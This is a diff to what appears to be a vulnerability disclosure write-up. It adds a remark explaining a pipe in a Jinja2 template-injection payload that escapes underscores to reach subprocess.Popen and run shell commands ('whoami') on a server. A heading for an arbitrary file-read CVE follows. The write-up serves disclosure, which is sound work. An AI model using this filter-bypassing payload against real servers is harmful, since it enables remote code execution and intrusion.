@@ -117,6 +117,8 @@ We can see that `subprocess.Popen` has the id 418!
 
 Now we can use that to create our final payload which we can use to run arbitrary commands on the server: `{{[]|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(418)('whoami',shell=True,stdout=-1)|attr('communicate')()|attr('\x5f\x5fgetitem\x5f\x5f')(0)|attr('decode')('utf-8')}}`
 
+(The `|attr('decode')('utf-8')` pipe makes sure that the output is properly formatted, so that not everything is embedded between `'` and `'>`...)
+
 ### [CVE-2025-23212] Arbitrary Fileread: Users can read the content of arbitrary files on the server (7.7 High)
 Every user has access to "External Recipes", where they can manage storage folder locations.
 
